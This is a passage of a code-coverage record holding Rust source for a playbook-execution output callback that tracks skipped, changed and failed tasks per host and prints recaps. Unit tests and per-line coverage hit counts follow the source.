r.status != TaskHostStatus::Skipped || self.config.verbosity \u003e= 1);\n\n            let all_skipped = task\n                .results\n                .iter()\n                .all(|r| r.status == TaskHostStatus::Skipped);\n\n            if has_visible_results \u0026\u0026 !task.results.is_empty() {\n                // Print header if we have results to show\n                if !task.header_printed {\n                    println!(\"{}\", self.format_task_header(\u0026task.name));\n                }\n\n                // Print each result based on verbosity\n                for result in \u0026task.results {\n                    let should_print = match result.status {\n                        TaskHostStatus::Ok =\u003e self.config.verbosity \u003e= 2,\n                        TaskHostStatus::Changed =\u003e true,\n                        TaskHostStatus::Failed =\u003e true,\n                        TaskHostStatus::Skipped =\u003e self.config.verbosity \u003e= 1,\n                        TaskHostStatus::Unreachable =\u003e true,\n                    };\n\n                    if should_print {\n                        println!(\"{}\", self.format_host_result(result));\n                    }\n                }\n            }\n\n            // Track fully skipped tasks for summary\n            if all_skipped \u0026\u0026 !task.results.is_empty() {\n                let mut skipped_tasks = self.fully_skipped_tasks.write().await;\n                if !skipped_tasks.contains(\u0026task.name) {\n                    skipped_tasks.push(task.name.clone());\n                }\n            }\n        }\n    }\n\n    /// Prints the skipped tasks summary if configured.\n    async fn print_skip_summary(\u0026self) {\n        if !self.config.show_skip_summary {\n            return;\n        }\n\n        let total = *self.total_skipped.read().await;\n        let skipped_tasks = self.fully_skipped_tasks.read().await;\n\n        if total == 0 {\n            return;\n        }\n\n        let msg = if self.config.verbosity == 0 {\n            format!(\n                \"Skipped {} task execution(s) across {} task(s) (use -v to show)\",\n                total,\n                skipped_tasks.len()\n            )\n        } else {\n            format!(\n                \"Skipped {} task execution(s) across {} task(s)\",\n                total,\n                skipped_tasks.len()\n            )\n        };\n\n        if self.config.use_color {\n            println!(\"\\n{}\", msg.bright_black());\n        } else {\n            println!(\"\\n{}\", msg);\n        }\n    }\n}\n\nimpl Default for SkippyCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for SkippyCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            host_stats: Arc::clone(\u0026self.host_stats),\n            current_task: Arc::clone(\u0026self.current_task),\n            start_time: Arc::clone(\u0026self.start_time),\n            playbook_name: Arc::clone(\u0026self.playbook_name),\n            total_skipped: Arc::clone(\u0026self.total_skipped),\n            has_failures: Arc::clone(\u0026self.has_failures),\n            fully_skipped_tasks: Arc::clone(\u0026self.fully_skipped_tasks),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for SkippyCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        // Initialize state\n        *self.start_time.write().await = Some(Instant::now());\n        *self.playbook_name.write().await = Some(name.to_string());\n        self.host_stats.write().await.clear();\n        *self.total_skipped.write().await = 0;\n        *self.has_failures.write().await = false;\n        self.fully_skipped_tasks.write().await.clear();\n    }\n\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        // Flush any pending task\n        self.flush_task().await;\n\n        let stats = self.host_stats.read().await;\n        let start_time = self.start_time.read().await;\n\n        // Print recap header\n        let header = if self.config.use_color {\n            format!(\n                \"\\n{} {}\",\n                \"PLAY RECAP\".bright_white().bold(),\n                \"*\".repeat(60).bright_black()\n            )\n        } else {\n            format!(\"\\nPLAY RECAP {}\", \"*\".repeat(60))\n        };\n        println!(\"{}\", header);\n\n        // Print recap for each host in sorted order\n        let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n        hosts.sort();\n\n        for host in hosts {\n            if let Some(host_stats) = stats.get(host) {\n                println!(\"{}\", self.format_recap_line(host, host_stats));\n            }\n        }\n\n        // Print skip summary\n        self.print_skip_summary().await;\n\n        // Print duration\n        if let Some(start) = *start_time {\n            let duration = start.elapsed();\n            let status = if success {\n                if self.config.use_color {\n                    \"ok\".green().bold().to_string()\n                } else {\n                    \"ok\".to_string()\n                }\n            } else if self.config.use_color {\n                \"failed\".red().bold().to_string()\n            } else {\n                \"FAILED\".to_string()\n            };\n\n            let playbook_display = if self.config.use_color {\n                name.bright_white().bold().to_string()\n            } else {\n                name.to_string()\n            };\n\n            println!(\n                \"\\nPlaybook '{}' finished: {} in {:.2}s\",\n                playbook_display,\n                status,\n                duration.as_secs_f64()\n            );\n        }\n    }\n\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        // Flush any pending task from previous play\n        self.flush_task().await;\n\n        // Initialize stats for all hosts\n        let mut stats = self.host_stats.write().await;\n        for host in hosts {\n            stats.entry(host.clone()).or_default();\n        }\n\n        // Print play header\n        println!(\"{}\", self.format_play_header(name, hosts.len()));\n    }\n\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Flush any pending task\n        self.flush_task().await;\n    }\n\n    async fn on_task_start(\u0026self, name: \u0026str, _host: \u0026str) {\n        // Check if this is a new task\n        let current = self.current_task.write().await;\n\n        let is_new_task = current.as_ref().map(|t| t.name != name).unwrap_or(true);\n\n        if is_new_task {\n            // Flush previous task if exists\n            drop(current);\n            self.flush_task().await;\n\n            // Start new task\n            let mut current = self.current_task.write().await;\n            *current = Some(CurrentTask {\n                name: name.to_string(),\n                results: Vec::new(),\n                start_time: Instant::now(),\n                header_printed: false,\n            });\n        }\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        // Update host stats\n        let mut stats = self.host_stats.write().await;\n        let host_stats = stats.entry(result.host.clone()).or_default();\n\n        let status = if result.result.skipped {\n            host_stats.skipped += 1;\n            let mut total = self.total_skipped.write().await;\n            *total += 1;\n            TaskHostStatus::Skipped\n        } else if !result.result.success {\n            host_stats.failed += 1;\n            *self.has_failures.write().await = true;\n            TaskHostStatus::Failed\n        } else if result.result.changed {\n            host_stats.changed += 1;\n            TaskHostStatus::Changed\n        } else {\n            host_stats.ok += 1;\n            TaskHostStatus::Ok\n        };\n\n        drop(stats);\n\n        // Add result to current task\n        let mut current = self.current_task.write().await;\n\n        if let Some(task) = current.as_mut() {\n            // Check if we need to print header immediately for failures\n            let should_print_header =\n                matches!(status, TaskHostStatus::Failed | TaskHostStatus::Unreachable)\n                    \u0026\u0026 !task.header_printed;\n\n            if should_print_header {\n                println!(\"{}\", self.format_task_header(\u0026task.name));\n                task.header_printed = true;\n            }\n\n            let host_result = TaskHostResult {\n                host: result.host.clone(),\n                status,\n                message: if !result.result.success || status == TaskHostStatus::Unreachable {\n                    Some(result.result.message.clone())\n                } else {\n                    None\n                },\n                duration: result.duration,\n            };\n\n            // For failures, print immediately\n            if matches!(status, TaskHostStatus::Failed | TaskHostStatus::Unreachable) {\n                println!(\"{}\", self.format_host_result(\u0026host_result));\n            }\n\n            task.results.push(host_result);\n        }\n    }\n\n    async fn on_handler_triggered(\u0026self, _name: \u0026str) {\n        // Silent - handlers are internal details\n    }\n\n    async fn on_facts_gathered(\u0026self, _host: \u0026str, _facts: \u0026Facts) {\n        // Silent - fact gathering is internal\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[tokio::test]\n    async fn test_skippy_callback_default() {\n        let callback = SkippyCallback::new();\n        assert_eq!(callback.config.verbosity, 0);\n        assert!(callback.config.show_skip_summary);\n    }\n\n    #[tokio::test]\n    async fn test_skippy_callback_with_verbosity() {\n        let callback = SkippyCallback::with_verbosity(2);\n        assert_eq!(callback.config.verbosity, 2);\n    }\n\n    #[tokio::test]\n    async fn test_skippy_tracks_skipped() {\n        let callback = SkippyCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        // Skipped task\n        callback.on_task_start(\"skipped-task\", \"host1\").await;\n        let skipped =\n            create_execution_result(\"host1\", \"skipped-task\", true, false, true, \"skipped\");\n        callback.on_task_complete(\u0026skipped).await;\n\n        assert_eq!(callback.total_skipped().await, 1);\n\n        let stats = callback.host_stats.read().await;\n        let host_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host_stats.skipped, 1);\n    }\n\n    #[tokio::test]\n    async fn test_skippy_tracks_changed() {\n        let callback = SkippyCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        callback.on_task_start(\"change-task\", \"host1\").await;\n        let changed = create_execution_result(\"host1\", \"change-task\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed).await;\n\n        let stats = callback.host_stats.read().await;\n        let host_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host_stats.changed, 1);\n        assert!(host_stats.has_changes());\n    }\n\n    #[tokio::test]\n    async fn test_skippy_tracks_failures() {\n        let callback = SkippyCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        callback.on_task_start(\"failed-task\", \"host1\").await;\n        let failed = create_execution_result(\"host1\", \"failed-task\", false, false, false, \"error\");\n        callback.on_task_complete(\u0026failed).await;\n\n        assert!(callback.has_failures().await);\n\n        let stats = callback.host_stats.read().await;\n        let host_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host_stats.failed, 1);\n        assert!(host_stats.has_issues());\n    }\n\n    #[tokio::test]\n    async fn test_skippy_fully_skipped_tasks() {\n        let callback = SkippyCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        // Task skipped on all hosts\n        callback.on_task_start(\"all-skipped\", \"host1\").await;\n        let skipped1 =\n            create_execution_result(\"host1\", \"all-skipped\", true, false, true, \"skipped\");\n        callback.on_task_complete(\u0026skipped1).await;\n\n        callback.on_task_start(\"all-skipped\", \"host2\").await;\n        let skipped2 =\n            create_execution_result(\"host2\", \"all-skipped\", true, false, true, \"skipped\");\n        callback.on_task_complete(\u0026skipped2).await;\n\n        // Flush to process\n        callback.flush_task().await;\n\n        let skipped_tasks = callback.fully_skipped_tasks().await;\n        assert!(skipped_tasks.contains(\u0026\"all-skipped\".to_string()));\n    }\n\n    #[tokio::test]\n    async fn test_skippy_mixed_results() {\n        let callback = SkippyCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        // Mix of results\n        callback.on_task_start(\"task1\", \"host1\").await;\n        let ok = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok).await;\n\n        callback.on_task_start(\"task2\", \"host1\").await;\n        let changed = create_execution_result(\"host1\", \"task2\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed).await;\n\n        callback.on_task_start(\"task3\", \"host1\").await;\n        let skipped = create_execution_result(\"host1\", \"task3\", true, false, true, \"skipped\");\n        callback.on_task_complete(\u0026skipped).await;\n\n        let stats = callback.host_stats.read().await;\n        let host_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host_stats.ok, 1);\n        assert_eq!(host_stats.changed, 1);\n        assert_eq!(host_stats.skipped, 1);\n        assert_eq!(host_stats.failed, 0);\n    }\n\n    #[test]\n    fn test_truncate_name() {\n        let config = SkippyConfig {\n            max_task_name_length: 20,\n            ..Default::default()\n        };\n        let callback = SkippyCallback::with_config(config);\n\n        assert_eq!(callback.truncate_name(\"short\"), \"short\");\n        assert_eq!(\n            callback.truncate_name(\"this is a very long task name that exceeds the limit\"),\n            \"this is a very lo...\"\n        );\n    }\n\n    #[test]\n    fn test_host_stats_has_issues() {\n        let mut stats = HostStats::default();\n        assert!(!stats.has_issues());\n\n        stats.failed = 1;\n        assert!(stats.has_issues());\n\n        stats.failed = 0;\n        stats.unreachable = 1;\n        assert!(stats.has_issues());\n    }\n\n    #[test]\n    fn test_host_stats_has_changes() {\n        let mut stats = HostStats::default();\n        assert!(!stats.has_changes());\n\n        stats.changed = 1;\n        assert!(stats.has_changes());\n    }\n\n    #[test]\n    fn test_config_builder() {\n        let config = SkippyConfig::with_verbosity(1)\n            .with_timing()\n            .without_color();\n\n        assert_eq!(config.verbosity, 1);\n        assert!(config.show_timing);\n        assert!(!config.use_color);\n    }\n\n    #[tokio::test]\n    async fn test_clone_shares_state() {\n        let callback1 = SkippyCallback::new();\n        let callback2 = callback1.clone();\n\n        callback1.on_playbook_start(\"test\").await;\n\n        // Both should share the same state\n        assert!(callback2.start_time.read().await.is_some());\n    }\n\n    #[test]\n    fn test_default_trait() {\n        let callback = SkippyCallback::default();\n        assert_eq!(callback.config.verbosity, 0);\n    }\n}\n","traces":[{"line":70,"address":[33267504],"length":1,"stats":{"Line":1}},{"line":84,"address":[33258880],"length":1,"stats":{"Line":1}},{"line":92,"address":[33258816],"length":1,"stats":{"Line":1}},{"line":93,"address":[33258819],"length":1,"stats":{"Line":1}},{"line":94,"address":[33258823],"length":1,"stats":{"Line":1}},{"line":98,"address":[33258848],"length":1,"stats":{"Line":1}},{"line":99,"address":[33258851],"length":1,"stats":{"Line":1}},{"line":100,"address":[33258855],"length":1,"stats":{"Line":1}},{"line":121,"address":[33266544],"length":1,"stats":{"Line":1}},{"line":122,"address":[33266554],"length":1,"stats":{"Line":1}},{"line":126,"address":[33266592],"length":1,"stats":{"Line":1}},{"line":127,"address":[33266597],"length":1,"stats":{"Line":1}},{"line":216,"address":[33266496],"length":1,"stats":{"Line":1}},{"line":217,"address":[33266509],"length":1,"stats":{"Line":1}},{"line":226,"address":[33260224],"length":1,"stats":{"Line":1}},{"line":227,"address":[33260245],"length":1,"stats":{"Line":1}},{"line":232,"address":[33259008,33259841],"length":1,"stats":{"Line":1}},{"line":235,"address":[33259043],"length":1,"stats":{"Line":1}},{"line":236,"address":[33259100,33259183],"length":1,"stats":{"Line":2}},{"line":237,"address":[33259280,33259208],"length":1,"stats":{"Line":2}},{"line":238,"address":[33259315,33259401],"length":1,"stats":{"Line":2}},{"line":239,"address":[33259495,33259426],"length":1,"stats":{"Line":2}},{"line":240,"address":[33259520,33259589],"length":1,"stats":{"Line":2}},{"line":241,"address":[33259614,33259670],"length":1,"stats":{"Line":2}},{"line":246,"address":[31046393,31046900,31046432,31046329,31046556,31046304],"length":1,"stats":{"Line":4}},{"line":247,"address":[31046420,31046484,31046587,31046850,31046377],"length":1,"stats":{"Line":3}},{"line":251,"address":[31047524,31046937,31047001,31046912,31047040,31047164],"length":1,"stats":{"Line":4}},{"line":252,"address":[31046985,31047028,31047092,31047195,31047465],"length":1,"stats":{"Line":3}},{"line":256,"address":[33266480,33266488],"length":1,"stats":{"Line":4}},{"line":257,"address":[31051096,31050654,31050611,31050718,31050821],"length":1,"stats":{"Line":3}},{"line":261,"address":[33259904],"length":1,"stats":{"Line":1}},{"line":262,"address":[33259976],"length":1,"stats":{"Line":1}},{"line":263,"address":[33260192],"length":1,"stats":{"Line":1}},{"line":265,"address":[33260054],"length":1,"stats":{"Line":1}},{"line":267,"address":[33260001],"length":1,"stats":{"Line":1}},{"line":273,"address":[33266439,33265328,33266445],"length":1,"stats":{"Line":1}},{"line":274,"address":[33265384],"length":1,"stats":{"Line":1}},{"line":275,"address":[33265394,33265452],"length":1,"stats":{"Line":2}},{"line":276,"address":[33265524],"length":1,"stats":{"Line":1}},{"line":278,"address":[33265553],"length":1,"stats":{"Line":1}},{"line":279,"address":[33266059,33265886,33265981],"length":1,"stats":{"Line":1}},{"line":281,"address":[33265604,33265837],"length":1,"stats":{"Line":2}},{"line":282,"address":[33265940,33265869],"length":1,"stats":{"Line":2}},{"line":283,"address":[33265964,33266032],"length":1,"stats":{"Line":2}},{"line":286,"address":[33265564,33265679],"length":1,"stats":{"Line":0}},{"line":291,"address":[33265305,33265311,33264176],"length":1,"stats":{"Line":1}},{"line":292,"address":[33264317,33264221],"length":1,"stats":{"Line":1}},{"line":293,"address":[33264282],"length":1,"stats":{"Line":1}},{"line":295,"address":[33264309],"length":1,"stats":{"Line":1}},{"line":296,"address":[33264736,33264828,33264905],"length":1,"stats":{"Line":1}},{"line":298,"address":[33264680,33264396],"length":1,"stats":{"Line":2}},{"line":299,"address":[33264707,33264780],"length":1,"stats":{"Line":2}},{"line":300,"address":[33264878,33264812],"length":1,"stats":{"Line":2}},{"line":304,"address":[33264335,33264471],"length":1,"stats":{"Line":0}},{"line":309,"address":[33262249,33261904,33262243],"length":1,"stats":{"Line":1}},{"line":310,"address":[33261953],"length":1,"stats":{"Line":1}},{"line":312,"address":[33261996],"length":1,"stats":{"Line":0}},{"line":313,"address":[33262112],"length":1,"stats":{"Line":0}},{"line":315,"address":[33262084],"length":1,"stats":{"Line":0}},{"line":319,"address":[33262009],"length":1,"stats":{"Line":1}},{"line":320,"address":[33262290],"length":1,"stats":{"Line":1}},{"line":322,"address":[33262262],"length":1,"stats":{"Line":0}},{"line":326,"address":[33262029],"length":1,"stats":{"Line":1}},{"line":327,"address":[33262435],"length":1,"stats":{"Line":1}},{"line":329,"address":[33262404],"length":1,"stats":{"Line":0}},{"line":333,"address":[33262049],"length":1,"stats":{"Line":0}},{"line":334,"address":[33262610],"length":1,"stats":{"Line":0}},{"line":336,"address":[33262579],"length":1,"stats":{"Line":0}},{"line":340,"address":[33262069],"length":1,"stats":{"Line":0}},{"line":341,"address":[33262758],"length":1,"stats":{"Line":0}},{"line":343,"address":[33262727],"length":1,"stats":{"Line":0}},{"line":348,"address":[33262171],"length":1,"stats":{"Line":1}},{"line":349,"address":[33262931,33263021],"length":1,"stats":{"Line":2}},{"line":351,"address":[33262992,33262907],"length":1,"stats":{"Line":0}},{"line":354,"address":[33262999],"length":1,"stats":{"Line":1}},{"line":355,"address":[33263149,33263289],"length":1,"stats":{"Line":0}},{"line":357,"address":[33263210,33263137],"length":1,"stats":{"Line":2}},{"line":360,"address":[33263217,33263467],"length":1,"stats":{"Line":2}},{"line":361,"address":[33263519],"length":1,"stats":{"Line":1}},{"line":362,"address":[33263606,33263535],"length":1,"stats":{"Line":2}},{"line":364,"address":[33263799,33263504],"length":1,"stats":{"Line":2}},{"line":367,"address":[33263845,33263716],"length":1,"stats":{"Line":2}},{"line":374,"address":[33260620,33260288,33260626],"length":1,"stats":{"Line":0}},{"line":375,"address":[33260365],"length":1,"stats":{"Line":0}},{"line":376,"address":[33260395],"length":1,"stats":{"Line":0}},{"line":377,"address":[33260810],"length":1,"stats":{"Line":0}},{"line":379,"address":[33260784],"length":1,"stats":{"Line":0}},{"line":381,"address":[33260379],"length":1,"stats":{"Line":0}},{"line":382,"address":[33260428],"length":1,"stats":{"Line":0}},{"line":383,"address":[33260675],"length":1,"stats":{"Line":0}},{"line":385,"address":[33260649],"length":1,"stats":{"Line":0}},{"line":387,"address":[33260415],"length":1,"stats":{"Line":0}},{"line":388,"address":[33260476],"length":1,"stats":{"Line":0}},{"line":390,"address":[33260453],"length":1,"stats":{"Line":0}},{"line":393,"address":[31047971,31047977,31047536],"length":1,"stats":{"Line":0}},{"line":394,"address":[31047580],"length":1,"stats":{"Line":0}},{"line":395,"address":[31047611,31047639],"length":1,"stats":{"Line":0}},{"line":396,"address":[31047646,31048213],"length":1,"stats":{"Line":0}},{"line":397,"address":[31048273,31047630,31048159],"length":1,"stats":{"Line":0}},{"line":398,"address":[31048041,31047747],"length":1,"stats":{"Line":0}},{"line":400,"address":[31047853,31047698],"length":1,"stats":{"Line":0}},{"line":403,"address":[31047594],"length":1,"stats":{"Line":0}},{"line":407,"address":[33261004,33261232,33261155,33261081,33261278],"length":1,"stats":{"Line":0}},{"line":410,"address":[33260533],"length":1,"stats":{"Line":0}},{"line":411,"address":[33260976],"length":1,"stats":{"Line":0}},{"line":412,"address":[33261050],"length":1,"stats":{"Line":0}},{"line":413,"address":[33261127],"length":1,"stats":{"Line":0}},{"line":414,"address":[33261201],"length":1,"stats":{"Line":0}},{"line":419,"address":[31043503,31043651,31043579,31043472,31043793,31044947,31043622],"length":1,"stats":{"Line":4}},{"line":420,"address":[31043556,31043706,31043827,31043609],"length":1,"stats":{"Line":2}},{"line":422,"address":[31044266,31044045,31044124],"length":1,"stats":{"Line":3}},{"line":424,"address":[31044236,31044435,31044378],"length":1,"stats":{"Line":3}},{"line":427,"address":[31046238,31044394,31046208],"length":1,"stats":{"Line":3}},{"line":429,"address":[31044529,31044581,31044444],"length":1,"stats":{"Line":3}},{"line":432,"address":[31046185,31046160,31044553],"length":1,"stats":{"Line":3}},{"line":434,"address":[31044623,31044591],"length":1,"stats":{"Line":2}},{"line":436,"address":[31044665],"length":1,"stats":{"Line":1}},{"line":437,"address":[31044770,31044682],"length":1,"stats":{"Line":2}},{"line":441,"address":[31044963,31044720],"length":1,"stats":{"Line":2}},{"line":442,"address":[31045068],"length":1,"stats":{"Line":1}},{"line":443,"address":[31045106],"length":1,"stats":{"Line":1}},{"line":444,"address":[31045128],"length":1,"stats":{"Line":1}},{"line":445,"address":[31045138],"length":1,"stats":{"Line":0}},{"line":446,"address":[31045156],"length":1,"stats":{"Line":0}},{"line":447,"address":[31045178],"length":1,"stats":{"Line":0}},{"line":450,"address":[31045186],"length":1,"stats":{"Line":1}},{"line":451,"address":[31045213],"length":1,"stats":{"Line":1}},{"line":457,"address":[31045402,31044602],"length":1,"stats":{"Line":2}},{"line":458,"address":[25985102],"length":1,"stats":{"Line":1}},{"line":459,"address":[31045852,31046052,31045909,31045996],"length":1,"stats":{"Line":3}},{"line":460,"address":[31046006,31045985],"length":1,"stats":{"Line":2}},{"line":467,"address":[31048491,31048590,31048383,31048448,31048729,31049208,31048352],"length":1,"stats":{"Line":0}},{"line":468,"address":[31048436],"length":1,"stats":{"Line":0}},{"line":472,"address":[31048478,31048522,31048645,31048763],"length":1,"stats":{"Line":0}},{"line":473,"address":[26023390],"length":1,"stats":{"Line":0}},{"line":475,"address":[31049457],"length":1,"stats":{"Line":0}},{"line":479,"address":[31049489],"length":1,"stats":{"Line":0}},{"line":480,"address":[31049507,31049655],"length":1,"stats":{"Line":0}},{"line":483,"address":[31049524,31049621],"length":1,"stats":{"Line":0}},{"line":486,"address":[31049544,31049909],"length":1,"stats":{"Line":0}},{"line":489,"address":[31049875,31049561],"length":1,"stats":{"Line":0}},{"line":493,"address":[31050275,31050494,31049851],"length":1,"stats":{"Line":0}},{"line":494,"address":[31050143,31050308],"length":1,"stats":{"Line":0}},{"line":496,"address":[31050206,31050108],"length":1,"stats":{"Line":0}},{"line":502,"address":[33267600],"length":1,"stats":{"Line":1}},{"line":503,"address":[33267608],"length":1,"stats":{"Line":1}},{"line":508,"address":[33267179,33267173,33266608],"length":1,"stats":{"Line":1}},{"line":510,"address":[33266638],"length":1,"stats":{"Line":1}},{"line":511,"address":[33266657],"length":1,"stats":{"Line":1}},{"line":512,"address":[33266672,33266735],"length":1,"stats":{"Line":2}},{"line":513,"address":[33266740,33266800],"length":1,"stats":{"Line":2}},{"line":514,"address":[33266805,33266865],"length":1,"stats":{"Line":2}},{"line":515,"address":[33266870,33266930],"length":1,"stats":{"Line":2}},{"line":516,"address":[33266938,33267001],"length":1,"stats":{"Line":2}},{"line":517,"address":[33267009],"length":1,"stats":{"Line":1}},{"line":524,"address":[31038933,31038085,31038114,31038043,31038064,31037840,31037871,31037958,31038001,31038022,31038309,31041230],"length":1,"stats":{"Line":4}},{"line":526,"address":[26128479],"length":1,"stats":{"Line":2}},{"line":527,"address":[26128619,26128673,26128494],"length":1,"stats":{"Line":1}},{"line":528,"address":[26128512],"length":1,"stats":{"Line":1}},{"line":529,"address":[31039932,31040057,31038051],"length":1,"stats":{"Line":1}},{"line":530,"address":[26128548],"length":1,"stats":{"Line":1}},{"line":531,"address":[26128566],"length":1,"stats":{"Line":1}},{"line":534,"address":[33246778],"length":1,"stats":{"Line":0}},{"line":536,"address":[31028927,31028979,31029118,31029216],"length":1,"stats":{"Line":0}},{"line":538,"address":[31029518,31029000,31029382],"length":1,"stats":{"Line":0}},{"line":539,"address":[31029838,31029021,31029759,31029933],"length":1,"stats":{"Line":0}},{"line":542,"address":[31030175],"length":1,"stats":{"Line":0}},{"line":543,"address":[31030597,31030756,31030672],"length":1,"stats":{"Line":0}},{"line":545,"address":[31030217,31030538],"length":1,"stats":{"Line":0}},{"line":546,"address":[31030729,31030565,31030649],"length":1,"stats":{"Line":0}},{"line":549,"address":[31030303,31030185],"length":1,"stats":{"Line":0}},{"line":551,"address":[31030504,31031100],"length":1,"stats":{"Line":0}},{"line":554,"address":[31031177,31031247],"length":1,"stats":{"Line":0}},{"line":555,"address":[31031293,31031375],"length":1,"stats":{"Line":0}},{"line":557,"address":[31031390,31031570],"length":1,"stats":{"Line":0}},{"line":558,"address":[31031782,31031638],"length":1,"stats":{"Line":0}},{"line":559,"address":[31031876],"length":1,"stats":{"Line":0}},{"line":564,"address":[31029042,31031673,31032115],"length":1,"stats":{"Line":0}},{"line":567,"address":[31032272,31032345],"length":1,"stats":{"Line":0}},{"line":568,"address":[31032397,31032472],"length":1,"stats":{"Line":0}},{"line":569,"address":[31032487],"length":1,"stats":{"Line":0}},{"line":570,"address":[31032521],"length":1,"stats":{"Line":0}},{"line":571,"address":[31032778,31032814],"length":1,"stats":{"Line":0}},{"line":573,"address":[31032747,31032809],"length":1,"stats":{"Line":0}},{"line":575,"address":[31032501],"length":1,"stats":{"Line":0}},{"line":576,"address":[31032571,31032631],"length":1,"stats":{"Line":0}},{"line":578,"address":[31032602,31032540],"length":1,"stats":{"Line":0}},{"line":581,"address":[31032612],"length":1,"stats":{"Line":0}},{"line":582,"address":[31032973,31033070],"length":1,"stats":{"Line":0}},{"line":584,"address":[31033044,31032938],"length":1,"stats":{"Line":0}},{"line":587,"address":[31033054,31033236],"length":1,"stats":{"Line":0}},{"line":596,"address":[31025472,31025560,31025594,31025614,31025718,31025995,31026640,31025497],"length":1,"stats":{"Line":4}},{"line":598,"address":[26121041],"length":1,"stats":{"Line":2}},{"line":601,"address":[26121057],"length":1,"stats":{"Line":1}},{"line":602,"address":[31026290,31026211],"length":1,"stats":{"Line":2}},{"line":603,"address":[31026667,31026402],"length":1,"stats":{"Line":2}},{"line":607,"address":[31026422],"length":1,"stats":{"Line":1}},{"line":610,"address":[31025432,31025132,31025458,31025168,31025049,31025024,31025267],"length":1,"stats":{"Line":0}},{"line":612,"address":[31025125,31025156,31025223,31025298],"length":1,"stats":{"Line":0}},{"line":615,"address":[31026761,31026838,31026890,31027044,31026736,31026914,31027588,31026875,31028664],"length":1,"stats":{"Line":4}},{"line":617,"address":[31027075,31026865,31026818,31026966],"length":1,"stats":{"Line":2}},{"line":619,"address":[31027282,31027345,31028809,31028784],"length":1,"stats":{"Line":4}},{"line":621,"address":[31027421],"length":1,"stats":{"Line":1}},{"line":623,"address":[31027450],"length":1,"stats":{"Line":1}},{"line":624,"address":[26121217],"length":1,"stats":{"Line":1}},{"line":627,"address":[26121233],"length":1,"stats":{"Line":1}},{"line":628,"address":[31028254,31028495,31028507],"length":1,"stats":{"Line":2}},{"line":629,"address":[31028071],"length":1,"stats":{"Line":1}},{"line":630,"address":[31028140],"length":1,"stats":{"Line":1}},{"line":631,"address":[31028188],"length":1,"stats":{"Line":1}},{"line":637,"address":[31033930,31033888,31033909,31034093,31033845,31035216,31037683,31033728,31037720,31033759],"length":1,"stats":{"Line":4}},{"line":639,"address":[26127039],"length":1,"stats":{"Line":2}},{"line":640,"address":[31034349,31034421],"length":1,"stats":{"Line":2}},{"line":642,"address":[31034522],"length":1,"stats":{"Line":1}},{"line":643,"address":[31035070,31034566,31035095],"length":1,"stats":{"Line":2}},{"line":644,"address":[26127054],"length":1,"stats":{"Line":2}},{"line":645,"address":[31035453,31035566,31035510],"length":1,"stats":{"Line":2}},{"line":646,"address":[31035544],"length":1,"stats":{"Line":1}},{"line":647,"address":[31034543,31035473,31035556,31035908],"length":1,"stats":{"Line":3}},{"line":648,"address":[31034701,31034676,31034602],"length":1,"stats":{"Line":2}},{"line":649,"address":[31033917,31034737,31035595,31034679],"length":1,"stats":{"Line":2}},{"line":650,"address":[31035904],"length":1,"stats":{"Line":1}},{"line":651,"address":[31035024,31034631,31034917],"length":1,"stats":{"Line":3}},{"line":652,"address":[31035026,31034863,31035017],"length":1,"stats":{"Line":2}},{"line":653,"address":[31035020],"length":1,"stats":{"Line":1}},{"line":655,"address":[31034835,31034911,31034919],"length":1,"stats":{"Line":2}},{"line":656,"address":[31034913],"length":1,"stats":{"Line":1}},{"line":659,"address":[31034948],"length":1,"stats":{"Line":1}},{"line":662,"address":[26127084],"length":1,"stats":{"Line":1}},{"line":664,"address":[31036268,31036325,31037612],"length":1,"stats":{"Line":3}},{"line":666,"address":[31036458,31036410],"length":1,"stats":{"Line":2}},{"line":668,"address":[31036501],"length":1,"stats":{"Line":1}},{"line":670,"address":[31036515,31036803],"length":1,"stats":{"Line":2}},{"line":671,"address":[31036572],"length":1,"stats":{"Line":1}},{"line":672,"address":[31036799],"length":1,"stats":{"Line":1}},{"line":676,"address":[31036533],"length":1,"stats":{"Line":1}},{"line":678,"address":[31036917,31037214,31036858,31036987],"length":1,"stats":{"Line":4}},{"line":683,"address":[31037024],"length":1,"stats":{"Line":1}},{"line":687,"address":[31037219,31037136],"length":1,"stats":{"Line":2}},{"line":688,"address":[31037445,31037370],"length":1,"stats":{"Line